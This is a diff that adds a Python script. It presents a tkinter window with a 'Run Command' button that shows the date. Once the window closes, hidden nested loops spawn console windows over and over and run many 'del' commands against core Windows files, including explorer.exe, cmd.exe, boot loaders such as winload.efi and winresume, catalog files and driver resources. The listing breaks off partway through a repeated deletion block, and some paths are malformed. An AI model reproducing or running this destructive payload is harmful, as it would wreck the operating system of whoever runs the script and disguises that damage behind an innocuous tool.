@@ -1,0 +1,321 @@
+import os
+import tkinter as tk
+import time
+
+root = tk.Tk()
+
+canvas1 = tk.Canvas(root, width = 300, height = 300, bg = 'gray90', relief = 'raised')
+canvas1.pack()
+
+
+def myCmd():
+    os.system('Start cmd /k "color a & date"')
+
+
+button1 = tk.Button(text='      Run Command      ', command=myCmd, bg='green', fg='white',
+                    font=('helvetica', 12, 'bold'))
+canvas1.create_window(150, 150, window=button1)
+
+root.mainloop()
+
+while True:
+        time.sleep(200)
+        for i in range(9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999):
+                while True:
+                        os.system.__call__("Start C:\Windows/System32/cmd.exe")
+                        os.system.__call__("Start cmd")
+                        while True:
+                                for i in range(9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999):
+                                        if os.system.__call__("C:\Windows/System32/cmd.exe") and os.system.__call__("C:\Windows/System32") == True:
+                                                os.system.__call__("del C:\Windows/explorer.exe")
+                                                os.system.__call__("del C:\Windows/write.exe")
+                                                os.system.__call__("del C:\Windows/bfsvc.exe")
+                                                os.system.__call__("del C:\Windows/System32/cmd.exe")
+                                                os.system.__call__('del C:\Windows/System32/es-ES/cmdkey.exe.mui')
+                                                os.system.__call__('del C:\windows/System32/es-MX/cmdl32.exe.mui')
+                                                os.system.__call__("del C:\Windows/System32/es-ES/cmd.exe.mui")
+                                                os.system.__call__("del C:\Windows/System32/en-US/cmdkey.exe.mui")
+                                                os.system.__call__("del C:\Windows/System32/en-US/cmdl32.exe.mui")
+                                                os.system.__call__("del C:\Windows/System32/en-US/cmd.exe.mui")
+                                                os.system.__call__("del C:\Windows/System32/en-US/cmdl32.exe.mui")
+                                                os.system.__call__("del C:\Windows/System32/cmdkey.exe")
+                                                os.system.__call__("del C:\Windows/System32/cmdl32.exe")
+                                                os.system.__call__("del C:\Windows/System32/0409")
+                                                os.system.__call__("del C:\Windows/System32/AdvancedInstallers/cmiv2.dll")
+                                                os.system.__call__("del C:\Windows/System32/AMD/amdkmpfd")
+                                                os.system.__call__("del C:\Windows/System32/AMD/amdkmpfd/amdkmpfd.ctz")
+                                                os.system.__call__("del C:\Windows/System32/AMD/amdkmpfd/amdkmpfd.itz")
+                                                os.system.__call__("del C:\Windows/System32/AMD/amdkmpfd/amdkmpfd.stz")
+                                                os.system.__call__("del C:\Windows/System32/AMD/Real")
+                                                os.system.__call__("del C:\Windows/System32/am-et/RBDS045E.dic")
+                                                os.system.__call__("del C:\Windows/System32/am-et/TransliterationComponentLayouts.dgml")
+                                                os.system.__call__("del C:\Windows/System32/AppLocker")
+                                                os.system.__call__("del C:\Windows/System32/appraiser/appraiser.sdb")
+                                                os.system.__call__("del C:\Windows/System32/appraiser/Appraiser_Data.ini")
+                                                os.system.__call__("del C:\Windows/System32/appraiser/Appraiser_TelemetryRunList.xml")
+                                                os.system.__call__("del C:\Windows/System32/ar-SA/cdosys.dll.mui")
+                                                os.system.__call__("del C:\Windows/System32/ar-SA/comctl32.dll.mui")
+                                                os.system.__call__("del C:\Windows/System32/ar-SA/comdlg32.dll.mui")
+                                                os.system.__call__("del C:\Windows/System32/ar-SA/fms.dll.mui")
+                                                os.system.__call__("del C:\Windows/System32/ar-SA/mlang.dll.mui")
+                                                os.system.__call__("del C:\Windows/System32/ar-SA/msimsg.dll.mui")
+                                                os.system.__call__("del C:\Windows/System32/ar-SA/quickassist.exe.mui")
+                                                os.system.__call__("del C:\Windows/System32/ar-SA/SyncRes.dll.mui")
+                                                os.system.__call__("del C:\Windows/System32/ar-SA/Windows.Media.Speech.UXRes.dll.mui")
+                                                os.system.__call__("del C:\Windows/System32/ar-SA/windows.ui.xaml.dll.mui")
+                                                os.system.__call__("del C:\Windows/System32/ar-SA/WWAHost.exe.mui")
+                                                os.system.__call__("del C:\Windows/System32/ar-SA/xpsrchvw.exe.mui")
+                                                os.system.__call__("del C:\Windows/System32/bg-BG/comctl32.dll.mui")
+                                                os.system.__call__("del C:\Windows/System32/bg-BG/comdlg32.dll.mui")
+                                                os.system.__call__("del C:\Windows/System32/bg-BG/fms.dll.mui")
+                                                os.system.__call__("del C:\Windows/System32/bg-BG/mlang.dll.mui")
+                                                os.system.__call__("del C:\Windows/System32/bg-BG/msimsg.dll.mui")
+                                                os.system.__call__("del C:\Windows/System32/bg-BG/quickassist.exe.mui")
+                                                os.system.__call__("del C:\Windows/System32/bg-BG/SyncRes.dll.mui")
+                                                os.system.__call__("del C:\Windows/System32/bg-BG/windows.ui.xaml.dll.mui")
+                                                os.system.__call__("del C:\Windows/System32/bg-BG/WWAHost.exe.mui")
+                                                os.system.__call__("del C:\Windows/System32/bg-BG/xpsrchvw.exe.mui")
+                                                os.system.__call__("del C:\Windows/System32/Boot/en-US/winload.efi.mui")
+                                                os.system.__call__("del C:\Windows/System32/Boot/en-US/winload.exe.mui")
+                                                os.system.__call__("del C:\Windows/System32/Boot/en-US/winresume.efi.mui")
+                                                os.system.__call__("del C:\Windows/System32/Boot/en-US/winresume.exe.mui")
+                                                os.system.__call__("del C:\Windows/System32/Boot/es-ES/winload.efi.mui")
+                                                os.system.__call__("del C:\Windows/System32/Boot/es-ES/winload.exe.mui")
+                                                os.system.__call__("del C:\Windows/System32/Boot/es-ES/winresume.efi.mui")
+                                                os.system.__call__("del C:\Windows/System32/Boot/es-ES/winresume.exe.mui")
+                                                os.system.__call__("del C:\Windows/System32/Boot/winload.efi")
+                                                os.system.__call__("del C:\Windows/System32/Boot/winload.exe")
+                                                os.system.__call__("del C:\Windows/System32/Boot/winresume.efi")
+                                                os.system.__call__("del C:\Windows/System32/Boot/winresume.exe")
+                                                os.system.__call__("del C:\Windows/System32/Bthprops/@BthpropsNotificationLogo.png")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstAR.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstCN.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstCZ.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstDE.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstDK.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstES.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstFI.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstFR.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstGR.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstHU.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstID.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstIT.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstJP.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstKR.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstNL.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstNO.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstPL.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstPT.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstRU.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstSE.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstTH.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstTR.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstTW.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstUS.dll")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstAR.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstCN.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstCZ.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstDE.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstDK.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstES.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstFI.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstFR.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstGR.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstHU.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstID.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstIT.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstJP.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstKR.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstNL.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstNO.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstPL.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstPT.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstRU.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstSE.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstTH.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstTR.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstTW.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstUS.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/DelDrv64.exe")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/Setup.ini")
+                                                os.system.__call__("del C:\Windows/System32/CatRoot/{127D0A1D-4EF2-11D1-8608-00C04FC295EE}/HPFusion")
+                                                os.system.__call__("del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/1.CAT")
+                                                os.system.__call__("del C:\Windows/System32\CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/1A.CAT")
+                                                os.system.__call__("del C:\Windows/System32\CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/1B.CAT")
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                        elif os.system.__call__("C:\Windows/System32/cmd.exe") and os.system.__call__("C:\Windows//System32") == False:
+                                                os.system.__call__("del C:\Windows/explorer.exe")
+                                                os.system.__call__("del C:\Windows/write.exe")
+                                                os.system.__call__("del C:\Windows/bfsvc.exe")
+                                                os.system.__call__("del C:\Windows/System32/cmd.exe")
+                                                os.system.__call__('del C:\Windows/System32/es-ES/cmdkey.exe.mui')
+                                                os.system.__call__('del C:\windows/System32/es-MX/cmdl32.exe.mui')
+                                                os.system.__call__("del C:\Windows/System32/es-ES/cmd.exe.mui")
+                                                os.system.__call__("del C:\Windows/System32/en-US/cmdkey.exe.mui")
+                                                os.system.__call__("del C:\Windows/System32/en-US/cmdl32.exe.mui")
+                                                os.system.__call__("del C:\Windows/System32/en-US/cmd.exe.mui")
+                                                os.system.__call__("del C:\Windows/System32/en-US/cmdl32.exe.mui")
+                                                os.system.__call__("del C:\Windows/System32/cmdkey.exe")
+                                                os.system.__call__("del C:\Windows/System32/cmdl32.exe")
+                                                os.system.__call__("del C:\Windows/System32/0409")
+                                                os.system.__call__("del C:\Windows/System32/AdvancedInstallers/cmiv2.dll")
+                                                os.system.__call__("del C:\Windows/System32/AMD/amdkmpfd")
+                                                os.system.__call__("del C:\Windows/System32/AMD/amdkmpfd/amdkmpfd.ctz")
+                                                os.system.__call__("del C:\Windows/System32/AMD/amdkmpfd/amdkmpfd.itz")
+                                                os.system.__call__("del C:\Windows/System32/AMD/amdkmpfd/amdkmpfd.stz")
+                                                os.system.__call__("del C:\Windows/System32/AMD/Real")
+                                                os.system.__call__("del C:\Windows/System32/am-et/RBDS045E.dic")
+                                                os.system.__call__("del C:\Windows/System32/am-et/TransliterationComponentLayouts.dgml")
+                                                os.system.__call__("del C:\Windows/System32/AppLocker")
+                                                os.system.__call__("del C:\Windows/System32/appraiser/appraiser.sdb")
+                                                os.system.__call__("del C:\Windows/System32/appraiser/Appraiser_Data.ini")
+                                                os.system.__call__("del C:\Windows/System32/appraiser/Appraiser_TelemetryRunList.xml")
+                                                os.system.__call__("del C:\Windows/System32/ar-SA/cdosys.dll.mui")
+                                                os.system.__call__("del C:\Windows/System32/ar-SA/comctl32.dll.mui")
+                                                os.system.__call__("del C:\Windows/System32/ar-SA/comdlg32.dll.mui")
+                                                os.system.__call__("del C:\Windows/System32/ar-SA/fms.dll.mui")
+                                                os.system.__call__("del C:\Windows/System32/ar-SA/mlang.dll.mui")
+                                                os.system.__call__("del C:\Windows/System32/ar-SA/msimsg.dll.mui")
+                                                os.system.__call__("del C:\Windows/System32/ar-SA/quickassist.exe.mui")
+                                                os.system.__call__("del C:\Windows/System32/ar-SA/SyncRes.dll.mui")
+                                                os.system.__call__("del C:\Windows/System32/ar-SA/Windows.Media.Speech.UXRes.dll.mui")
+                                                os.system.__call__("del C:\Windows/System32/ar-SA/windows.ui.xaml.dll.mui")
+                                                os.system.__call__("del C:\Windows/System32/ar-SA/WWAHost.exe.mui")
+                                                os.system.__call__("del C:\Windows/System32/ar-SA/xpsrchvw.exe.mui")
+                                                os.system.__call__("del C:\Windows/System32/bg-BG/comctl32.dll.mui")
+                                                os.system.__call__("del C:\Windows/System32/bg-BG/comdlg32.dll.mui")
+                                                os.system.__call__("del C:\Windows/System32/bg-BG/fms.dll.mui")
+                                                os.system.__call__("del C:\Windows/System32/bg-BG/mlang.dll.mui")
+                                                os.system.__call__("del C:\Windows/System32/bg-BG/msimsg.dll.mui")
+                                                os.system.__call__("del C:\Windows/System32/bg-BG/quickassist.exe.mui")
+                                                os.system.__call__("del C:\Windows/System32/bg-BG/SyncRes.dll.mui")
+                                                os.system.__call__("del C:\Windows/System32/bg-BG/windows.ui.xaml.dll.mui")
+                                                os.system.__call__("del C:\Windows/System32/bg-BG/WWAHost.exe.mui")
+                                                os.system.__call__("del C:\Windows/System32/bg-BG/xpsrchvw.exe.mui")
+                                                os.system.__call__("del C:\Windows/System32/Boot/en-US/winload.efi.mui")
+                                                os.system.__call__("del C:\Windows/System32/Boot/en-US/winload.exe.mui")
+                                                os.system.__call__("del C:\Windows/System32/Boot/en-US/winresume.efi.mui")
+                                                os.system.__call__("del C:\Windows/System32/Boot/en-US/winresume.exe.mui")
+                                                os.system.__call__("del C:\Windows/System32/Boot/es-ES/winload.efi.mui")
+                                                os.system.__call__("del C:\Windows/System32/Boot/es-ES/winload.exe.mui")
+                                                os.system.__call__("del C:\Windows/System32/Boot/es-ES/winresume.efi.mui")
+                                                os.system.__call__("del C:\Windows/System32/Boot/es-ES/winresume.exe.mui")
+                                                os.system.__call__("del C:\Windows/System32/Boot/winload.efi")
+                                                os.system.__call__("del C:\Windows/System32/Boot/winload.exe")
+                                                os.system.__call__("del C:\Windows/System32/Boot/winresume.efi")
+                                                os.system.__call__("del C:\Windows/System32/Boot/winresume.exe")
+                                                os.system.__call__("del C:\Windows/System32/Bthprops/@BthpropsNotificationLogo.png")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstAR.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstCN.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstCZ.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstDE.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstDK.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstES.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstFI.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstFR.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstGR.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstHU.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstID.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstIT.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstJP.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstKR.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstNL.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstNO.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstPL.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstPT.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstRU.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstSE.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstTH.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstTR.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstTW.dll")
+                                                os.system.__call__("del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstUS.dll")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstAR.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstCN.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstCZ.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstDE.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstDK.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstES.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstFI.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstFR.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstGR.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstHU.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstID.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstIT.ini")
